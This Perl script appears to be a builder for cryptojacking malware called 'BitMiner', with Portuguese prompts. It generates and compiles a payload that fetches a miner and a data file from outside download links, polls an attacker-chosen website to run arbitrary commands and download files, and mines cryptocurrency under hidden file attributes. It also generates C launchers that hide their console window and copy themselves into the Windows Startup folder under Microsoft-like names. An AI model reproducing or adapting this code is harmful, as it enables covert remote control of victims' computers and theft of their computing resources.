#!/usr/bin/perl
use Term::ANSIColor;
use warnings;
use strict;
use Config;

sub clear{
  if($Config{osname} =~ /win/i){
    system("cls");
  }else{
    system("clear");
  }
}

sub start {
  &banner;
  print "[" . color("RED"),"*",color("reset") . "] Digite o website controlador: ";
  my $website = <STDIN>;
  if(defined($website)){
    chomp $website;
	print "[" . color("RED"),"*",color("reset") . "] CPU ou GPU ? ";
	my $cpu_or_gpu = <STDIN>;
	if(defined($cpu_or_gpu)){
	  chomp $cpu_or_gpu;
	  my ($gcc, $command) = "gcc", undef;
	  $command = "NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
	  $command = "NsGpuCNMiner.exe" if $cpu_or_gpu =~ /GPU/i;
	  $cpu_or_gpu = "http://download1518.mediafire.com/49eb85rg18xg/o5c3rn5s2k349lu/NsCpuCNMiner32.exe" if $cpu_or_gpu =~ /CPU/i;
	  $cpu_or_gpu = "http://download846.mediafire.com/zskzcjqb4qcg/6hebk47rlq29t36/NsGpuCNMiner.exe" if $cpu_or_gpu =~ /GPU/i;
	  my $code =
<<HERE;
#!/usr/bin/perl
use LWP::UserAgent;
use LWP::Simple;

while(1){
  system("attrib -h ../$command");
  while(! -e "../$command" && ! -e "../Data.bin"){
    getstore("http://download1654.mediafireuserdownload.com/6c6s7a8jsabg/0nwra4eocjkemrl/Data.bin", "Data.bin");
	system("move Data.bin ../");
    getstore("$cpu_or_gpu", "$command");
    system("move $command ../");
  }
  if(-e "../$command"){
    my \$lwp = LWP::UserAgent->new; \$lwp->agent("Mozilla/5.0");
    while(1){
      my \$response = \$lwp->get("$website");
      open(RESPONSE, ">", "../response.txt");
      print RESPONSE \$response->decoded_content;
      close(RESPONSE);
      open(RESPONSE, "<", "../response.txt");
	  while(<RESPONSE>){
	    if(\$_ =~ /stop:(\\d+);/){
	      sleep \$1;
	    }
	    if(\$_ =~ /exec:(.*?);/){
	      system("\$1");
	    }
	    if(\$_ =~ /get:(.*?);name:(.*?);/){
	      getstore("\$1", "\$2");
	    }
	    if(\$_ =~ /miner->host:(.*?);email:(.*?);/){
	      system("cd ../ && $command -o stratum+tcp://\$1 -u \$2 -p x");
		  system("attrib +h ../$command");
	    }
	  }
	  close(RESPONSE);
    }
  }
}
HERE
      my $move =
<<HERE;
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(void){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
    system("copy Microsoft_init.exe %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup");
    system("copy Microsoft.exe %AppData%");
	system("cd %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup && Microsoft_init.exe");
}
HERE
      my $init =
<<HERE;
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(void){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
	system("cd %AppData% && Microsoft.exe");
}
HERE
      open(WORM, ">worm.pl");
	  print WORM $code;
	  close(WORM);
	  open(MOVE, ">move.c");
	  print MOVE $move;
	  close(MOVE);
	  open(MOVE, ">init.c");
	  print MOVE $init;
	  close(MOVE);
	  if($Config{osname} =~ /linux/i){
	    if($< != 0){
		  print "\n[", color("RED"),"*",color("reset") . "] Execute o programa como root !\n";
		  exit 0;
		}
		print "\n[", color("RED"),"*",color("reset") . "] Em 3 segundos, o programa ira instalar dependencias necessarias\n";
		sleep 3;
		system("sudo apt-get install mingw-w64 -y");
		$gcc = "i686-w64-mingw32-" . $gcc . " -m32";
	  }
	  if(-e "init.c"){
	    system("$gcc -o Microsoft_init.exe init.c");
		unlink "init.c";
	  }
	  if(-e "move.c"){
	    system("$gcc -o Move.exe move.c");
	    unlink "move.c";
	  }
	  if(-e "worm.pl"){
	    system("pp -o Microsoft.exe worm.pl");
	    unlink "worm.pl";
	  }
	  if(-e "Microsoft.exe" && -e "Move.exe"){
	    print "\n[" . color("RED"),"*",color("reset") . "] " . color("GREEN"),"Sucesso\n",color("reset");
	  }else{
	    print "\n[" . color("RED"),"*",color("reset") . "] " . print "Algo deu errado\n";
	  }
	  sleep 3;
	}
  }
  &start;
}
&start;

sub banner{
  &clear;
  print <<BANNER;
\n\t/\\
\t||_____-----_____-----_____
\t||   O                  O  \\
\t||    O\\\\    ___    //O    /
\t||       \\\\ /   \\//        \\
\t||         |_O O_|         /
\t||          ^ | ^          \\
\t||        // UUU \\\\        /
\t||    O//            \\\\O   \\
\t||   O                  O  /
\t||_____-----_____-----_____\\
\t||
\t||
BANNER
  print "\t\t" . color("YELLOW"),"BitMiner",color("reset") . "\n\n";
}
